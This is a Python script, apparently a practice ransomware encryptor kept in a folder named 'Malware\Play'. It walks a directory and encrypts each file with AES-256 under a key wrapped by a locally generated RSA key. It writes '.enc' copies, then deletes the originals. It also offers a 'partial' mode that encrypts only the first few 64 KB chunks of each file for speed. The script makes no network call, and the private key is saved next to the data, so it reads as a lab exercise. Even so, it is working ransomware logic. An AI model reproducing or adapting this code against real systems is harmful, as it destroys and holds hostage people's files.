import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

# Directory to encrypt
directory = r"D:\Cyber\Malware\Play"

# Exclusions: Do not encrypt these files
exclusions = [
    r"D:\Cyber\Malware\Play\public_key.pem",
    r"D:\Cyber\Malware\Play\private_key.pem",
    r"D:\Cyber\Malware\Play\enc.py",
    r"D:\Cyber\Malware\Play\dec.py"  # Assuming a decryption script exists
]

# Function to list all files in a directory, excluding specific files
def list_files(dir_path, exclusions):
    file_list = []
    for root, _, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in exclusions:
                file_list.append(file_path)
    return file_list

# Generate AES key
def generate_aes_key():
    return get_random_bytes(32)  # AES-256 key

# Encrypt data using AES
def encrypt_file_aes(file_path, aes_key, mode='full'):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    
    if mode == 'full':
        cipher_aes = AES.new(aes_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext)
        return cipher_aes.nonce + tag + ciphertext
    
    elif mode == 'partial':
        file_size = len(plaintext)
        
        if file_size <= 0x3fffffff:  # Up to 1 GB
            num_chunks = 2
        elif file_size <= 0x27fffffff:  # Up to 10 GB
            num_chunks = 3
        else:  # Greater than 10 GB
            num_chunks = 5

        chunk_size = 64 * 1024  # 64 KB
        encrypted_data = bytearray()
        
        for i in range(num_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, file_size)
            
            cipher_aes = AES.new(aes_key, AES.MODE_EAX)
            chunk, tag = cipher_aes.encrypt_and_digest(plaintext[start:end])
            encrypted_data.extend(cipher_aes.nonce + tag + chunk)
        
        # Include unencrypted remainder of the file
        encrypted_data.extend(plaintext[num_chunks * chunk_size:])
        return bytes(encrypted_data)

# Function to generate and save RSA keys
def generate_rsa_keys(public_key_path, private_key_path):
    key = RSA.generate(2048)
    
    private_key = key.export_key()
    with open(private_key_path, 'wb') as f:
        f.write(private_key)
    
    public_key = key.publickey().export_key()
    with open(public_key_path, 'wb') as f:
        f.write(public_key)

# Paths to save RSA keys
public_key_path = r"D:\Cyber\Malware\Play\public_key.pem"
private_key_path = r"D:\Cyber\Malware\Play\private_key.pem"

# Generate RSA keys
generate_rsa_keys(public_key_path, private_key_path)

# Encrypt AES key using RSA
def encrypt_aes_key_rsa(aes_key, public_key_path):
    with open(public_key_path, 'rb') as f:
        public_key = RSA.import_key(f.read())
    
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
    
    return encrypted_aes_key

# Encrypt all files in the directory
def encrypt_all_files(dir_path, public_key_path, mode='full'):
    files = list_files(dir_path, exclusions)
    aes_key = generate_aes_key()
    
    encrypted_aes_key = encrypt_aes_key_rsa(aes_key, public_key_path)
    
    for file_path in files:
        encrypted_data = encrypt_file_aes(file_path, aes_key, mode)
        encrypted_file_path = file_path + ".enc"
        
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_aes_key + encrypted_data)
        
        # Optionally, delete the original file
        os.remove(file_path)

# Input handling
def main():
    try:
        choice = int(input("Enter 1 for Partial \n2. for Full Encryption: "))
        if choice == 1:
            encryption_mode = 'partial'
            print("Selected Partial Encryption")
        elif choice == 2:
            encryption_mode = 'full'
            print("Selected Full Encryption")
        else:
            print("Invalid choice. Please enter 1 or 2.")
            return
        
        encrypt_all_files(directory, public_key_path, encryption_mode)
        print("Encryption completed.")
    except ValueError:
        print("Invalid input. Please enter a number.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
